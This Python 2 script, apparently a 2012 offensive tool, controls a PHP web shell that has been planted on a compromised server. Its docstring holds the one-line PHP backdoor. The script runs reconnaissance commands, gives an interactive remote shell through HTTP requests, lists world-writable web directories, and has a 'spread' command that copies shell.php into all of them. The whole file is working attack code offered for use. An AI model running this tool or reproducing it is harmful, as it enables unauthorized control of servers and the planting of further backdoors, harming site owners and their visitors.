#!/usr/bin/env python

'''
-*- coding: utf-8 -*-
Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>

Command controller for <?php system($_GET[parameter]); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.
'''

from sys import argv
from urllib2 import urlopen, quote, unquote, URLError, HTTPError
from subprocess import Popen
try:
    import readline
except ImportError:
    print '\n[!] readline module is required to handle the shell environment'
else:
    pass

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    HOT = '\033[97m'
    END = '\033[0m'

class Commander(object):
    def __init__(self, url=None):
        self.url = url
        self.source = None
        self.info = None
        self.writeables = None
        self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''.replace(' ','%20')

    # defining static methods
    @staticmethod
    def banner():
        return """%s
\t\t __         ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
\t\t|  |       /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
\t\t|  |      |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
\t\t|  |      |  |     |  |  |  | |  |\/|  | |  |\/|  |   /  /_\  \   |  . `  | |  |  |  |
\t\t|  |      |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
\t\t|__|       \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
\t\t--------------------------------------------------------------------------------------
        %s""" % (Colors.YELLOW, Colors.END)

    def ServerInfo(self):
        try:
            self.source = source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
            print Commander.banner()
        except HTTPError:
            print '\n[!] Invalid URL.'
            exit(1)
        try:
            local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except URLError:
            local_ip = 'Unknown'
        available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable', 'spread']
        self.info = \
        '''
        %s
        %sUser%s     :  %s%s%s
        %sID%s       :  %s%s%s
        %sKernel%s   :  %s%s%s
        %sCWD%s      :  %s%s%s
        %sHost IPs%s :  %s%s%s
        %sLocal IP%s :  %s%s%s
        %s

        %s[+] Available commands: %s.%s
        %s[+] Inserting%s %s!%s %sat the begining of the command will execute it on your box.%s
        ''' % ('-'* int(len(source[2])+12),
                Colors.RED, Colors.END,
                Colors.GREEN, source[0], Colors.END,    # current user
                Colors.RED, Colors.END,
                Colors.GREEN, source[1], Colors.END,    # current ID
                Colors.RED, Colors.END,
                Colors.GREEN, source[2], Colors.END,    # kernel version
                Colors.RED, Colors.END,
                Colors.GREEN, source[3], Colors.END,    # CWD
                Colors.RED, Colors.END,
                Colors.GREEN, ', '.join(source[4:]), Colors.END,    # host ip
                Colors.RED, Colors.END,
                Colors.GREEN, local_ip, Colors.END,                 # local ip
                '-'* int(len(source[2])+12),
                Colors.HOT, available_commands, Colors.END,         # available commands
                Colors.HOT, Colors.END, Colors.RED, Colors.END, Colors.HOT, Colors.END, # hint
                )
        print self.info

    def BackConnect(self):
        i = 1
        history = []
        while True:
            try:
                try:
                    command = quote(raw_input('%s%s@%s%s%s%s:~%s(%s)%s-$ ' % (self.source[0],
                        Colors.RED, Colors.END,
                        Colors.GREEN, self.source[4], Colors.END,
                        Colors.YELLOW, self.source[3], Colors.END)))
                except IndexError:
                    command = quote(raw_input('icommand\033[91m@\033[0m\033[92mserver:$ '))
                history.append(unquote(command))
                if command not in ['exit', 'quite', 'bye']:
                    if command == 'clear':
                        Popen('clear', shell=True).wait()
                    elif command == 'history':
                        x = 1
                        for command in history:
                            print '%2d %s' % (x, command)
                            x += 1
                    elif command.startswith('!'):
                        Popen(quote(command)[1:], shell=True).wait()
                    elif command == 'info':
                        print self.info
                    elif command == 'banner':
                        print Commander.banner()
                    elif command == 'writable':
                        self.cmd = quote("find /var/www/ -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print")
                        self.writeables = writeables = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
                        c = 1
                        for path in writeables:
                            print '%2d- %s' % (c, path)
                            c += 1
                    elif command == 'spread':
                        self.cmd = quote('find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp shell.php')
                        urlopen('%s%s' % (self.url, self.cmd))
                        print '[+] Successfully wrote shell.php to %d directory\n[+] Type writeable to check dirs' % len(self.writeables)
                    else:
                        source = urlopen('%s%s' % (self.url, command)).read()
                        if source:
                            print source.rstrip()
                        else:
                            print '%s: command not found' % quote(command)
                else:
                    print '\n\n[+] Preformed %d commands on the server.\n[!] Connection closed ..' % i
                    exit(1)
            except KeyboardInterrupt:
                print '\n\n[+] Preformed %d commands on the server.\n[!] Connection closed ..' % i
                exit(1)
            i += 1

def main():
    if len(argv) != 2:
        print '\n[+] Usage : %s Shell_URL\n[!] Example: %s http://www.test.com/shell.php?cmd=' % ((argv[0], )*2)
        exit(1)

    else:
        execute = Commander(str(argv[1]))
        execute.ServerInfo()
        execute.BackConnect()

if __name__ == '__main__':
    main()
